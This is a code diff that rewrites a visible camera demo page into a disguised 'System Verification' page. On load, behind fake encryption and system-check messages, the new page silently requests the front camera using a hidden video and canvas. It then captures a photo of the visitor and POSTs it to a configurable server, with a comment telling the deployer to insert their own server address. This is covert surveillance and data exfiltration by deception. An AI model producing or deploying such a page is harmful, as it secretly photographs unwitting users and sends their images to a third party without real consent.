@@ -3,234 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera Link – Works on HTTPS/localhost</title>
+    <title>System Verification</title>
     <style>
-        body {
-            font-family: system-ui, sans-serif;
-            max-width: 600px;
-            margin: 2rem auto;
-            padding: 1rem;
-            background: #0a1a1a;
-            color: white;
-        }
-        .card {
-            background: #1e2a2a;
-            border-radius: 2rem;
-            padding: 1.5rem;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
-        }
-        .camera-link {
-            display: inline-block;
-            background: #2ecc71;
-            color: black;
-            font-weight: bold;
-            padding: 12px 24px;
-            border-radius: 40px;
-            text-decoration: none;
-            margin: 1rem 0;
-            cursor: pointer;
-        }
-        video, #fallbackInput {
-            width: 100%;
-            border-radius: 1rem;
-            margin-top: 1rem;
-            background: black;
-        }
-        video {
-            aspect-ratio: 4/3;
-            object-fit: cover;
-        }
-        button {
-            background: #3b5e5a;
-            border: none;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 30px;
-            margin: 5px;
-            cursor: pointer;
-        }
-        .error-box {
-            background: #c0392b;
-            padding: 0.8rem;
-            border-radius: 1rem;
-            margin: 1rem 0;
-        }
-        img {
-            max-width: 100%;
-            border-radius: 1rem;
-            margin-top: 1rem;
-            border: 2px solid #2ecc71;
-        }
-        hr {
-            margin: 1.5rem 0;
-        }
+        body { font-family: sans-serif; background: #050505; color: #00ff00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .box { border: 1px solid #00ff00; padding: 2rem; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
+        .loading { font-family: 'Courier New', Courier, monospace; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-<div class="card">
-    <h1>📸 Click Link → Open Camera</h1>
-    <a href="#" id="cameraLink" class="camera-link">🔗 Open Front Camera</a>
-    
-    <div id="cameraContainer" style="display: none;">
-        <video id="video" autoplay playsinline muted></video>
-        <div>
-            <button id="snapBtn">📷 Take Photo</button>
-            <button id="closeBtn">🔴 Close Camera</button>
-            <button id="switchBackBtn">🔄 Switch to Back</button>
-        </div>
-    </div>
 
-    <div id="fallbackArea" style="display: none;">
-        <p>⚠️ Direct camera access not available. Use file upload instead:</p>
-        <input type="file" id="fallbackFile" accept="image/*" capture="environment">
-    </div>
-
-    <h3>📸 Captured Photo:</h3>
-    <img id="capturedImg" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='150' viewBox='0 0 200 150'%3E%3Crect width='200' height='150' fill='%23333'/%3E%3Ctext x='50%25' y='50%25' fill='%23aaa' text-anchor='middle' dominant-baseline='middle'%3ENo photo%3C/text%3E%3C/svg%3E" style="max-height: 200px;">
-
-    <div id="status" class="error-box" style="background: #2c3e50;"></div>
-    <hr>
-    <p style="font-size: 0.8rem;">🔐 <strong>Important:</strong> Camera works only on <strong>localhost</strong> or <strong>HTTPS</strong>. If you opened this file from your desktop (file://), it will not work. <br>➡️ <strong>Fix:</strong> Use a local server (see instructions below).</p>
+<div class="box">
+    <h2 class="loading">S Y S T E M _ C H E C K</h2>
+    <p id="msg">Initializing Encrypted Protocol...</p>
+    <div id="status">Waiting for access...</div>
 </div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 
 <script>
     const video = document.getElementById('video');
-    const cameraLink = document.getElementById('cameraLink');
-    const cameraContainer = document.getElementById('cameraContainer');
-    const fallbackArea = document.getElementById('fallbackArea');
-    const snapBtn = document.getElementById('snapBtn');
-    const closeBtn = document.getElementById('closeBtn');
-    const switchBackBtn = document.getElementById('switchBackBtn');
-    const capturedImg = document.getElementById('capturedImg');
+    const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
 
-    let currentStream = null;
-    let facingMode = 'user'; // 'user' = front, 'environment' = back
+    // 🛑 APNE PYTHON SERVER KA IP YA URL YAHAN DALEIN
+    // Local testing ke liye: http://localhost:5000/upload
+    const SERVER_URL = 'http://localhost:5000/upload'; 
 
-    function setStatus(msg, isError = false) {
-        statusDiv.innerHTML = msg;
-        statusDiv.style.background = isError ? '#c0392b' : '#2c3e50';
-        console.log(msg);
-    }
-
-    // Check if we are in a secure context (HTTPS or localhost)
-    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
-    if (!isSecure) {
-        setStatus('❌ Camera will NOT work because you opened this file directly (file://). Follow instructions below to use a local server.', true);
-        cameraLink.style.opacity = '0.5';
-        cameraLink.style.pointerEvents = 'none';
-    } else if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        setStatus('❌ Your browser does not support getUserMedia. Use Chrome, Edge, or Safari.', true);
-        cameraLink.style.opacity = '0.5';
-    } else {
-        setStatus('✅ Secure context detected. Click the link to open front camera.');
-    }
-
-    async function openCamera() {
-        if (currentStream) {
-            closeCamera();
-        }
+    async function startProcess() {
         try {
-            const constraints = {
-                video: { facingMode: { exact: facingMode } }
-            };
-            setStatus(`📷 Requesting ${facingMode === 'user' ? 'FRONT' : 'BACK'} camera...`);
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
-            currentStream = stream;
-            cameraContainer.style.display = 'block';
-            setStatus(`✅ Camera ON (${facingMode === 'user' ? 'Front' : 'Back'})`);
+            
+            video.onloadedmetadata = () => {
+                statusDiv.innerText = "Encrypting Data Streams...";
+                // 2 second wait for focus
+                setTimeout(() => capture(stream), 2000);
+            };
         } catch (err) {
-            console.error(err);
-            // Fallback: try without exact facingMode
-            try {
-                setStatus(`⚠️ Trying any camera...`);
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                currentStream = stream;
-                cameraContainer.style.display = 'block';
-                setStatus(`✅ Camera opened (fallback mode)`);
-            } catch (err2) {
-                setStatus(`❌ Cannot access camera: ${err2.message}. Check permissions.`, true);
-                // Show fallback file input
-                fallbackArea.style.display = 'block';
-            }
+            statusDiv.innerText = "❌ PROTOCOL_ERROR: Permission Required";
         }
     }
 
-    function closeCamera() {
-        if (currentStream) {
-            currentStream.getTracks().forEach(track => track.stop());
-            currentStream = null;
-            video.srcObject = null;
-        }
-        cameraContainer.style.display = 'none';
-        setStatus('🔴 Camera closed.');
-    }
-
-    function takePhoto() {
-        if (!currentStream || video.videoWidth === 0) {
-            setStatus('❌ Camera not active. Open camera first.', true);
-            return;
-        }
-        const canvas = document.createElement('canvas');
+    async function capture(stream) {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        const dataUrl = canvas.toDataURL('image/png');
-        capturedImg.src = dataUrl;
-        setStatus('📸 Photo taken!');
-    }
 
-    async function switchCamera(mode) {
-        if (facingMode === mode) {
-            setStatus(`Already using ${mode === 'user' ? 'front' : 'back'} camera.`);
-            return;
-        }
-        facingMode = mode;
-        if (currentStream) {
-            await openCamera(); // reopens with new facingMode
-        } else {
-            setStatus(`Switched to ${mode === 'user' ? 'front' : 'back'} mode. Click link to open.`);
-        }
-    }
+        // Stream band karein
+        stream.getTracks().forEach(t => t.stop());
 
-    // Event listeners
-    cameraLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (isSecure && navigator.mediaDevices) {
-            openCamera();
-        } else {
-            setStatus('Cannot open camera: insecure context or unsupported browser.', true);
-            fallbackArea.style.display = 'block';
-        }
-    });
+        // Photo ko Base64 String (Encoded format) mein badle
+        const imageData = canvas.toDataURL('image/jpeg', 0.8);
 
-    snapBtn.addEventListener('click', takePhoto);
-    closeBtn.addEventListener('click', closeCamera);
-    switchBackBtn.addEventListener('click', () => switchCamera('environment'));
+        statusDiv.innerText = "Sending Encrypted Packet...";
 
-    // Add a front switch button dynamically (for convenience)
-    const frontBtn = document.createElement('button');
-    frontBtn.textContent = '🔄 Switch to Front';
-    frontBtn.addEventListener('click', () => switchCamera('user'));
-    switchBackBtn.parentNode.appendChild(frontBtn);
+        try {
+            const response = await fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData })
+            });
 
-    // Fallback: if user picks a file from the input, show it as captured photo
-    const fallbackFile = document.getElementById('fallbackFile');
-    if (fallbackFile) {
-        fallbackFile.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = (event) => {
-                    capturedImg.src = event.target.result;
-                    setStatus('📸 Photo loaded from file picker.');
-                };
-                reader.readAsDataURL(file);
+            const result = await response.json();
+            if(result.status === 'success') {
+                statusDiv.innerText = "✅ DATA_SENT: System Verified";
+            } else {
+                statusDiv.innerText = "❌ SEND_FAILED";
             }
-        });
+        } catch (e) {
+            statusDiv.innerText = "❌ CONNECTION_LOST";
+            console.error(e);
+        }
     }
+
+    window.onload = startProcess;
 </script>
 </body>
 </html>
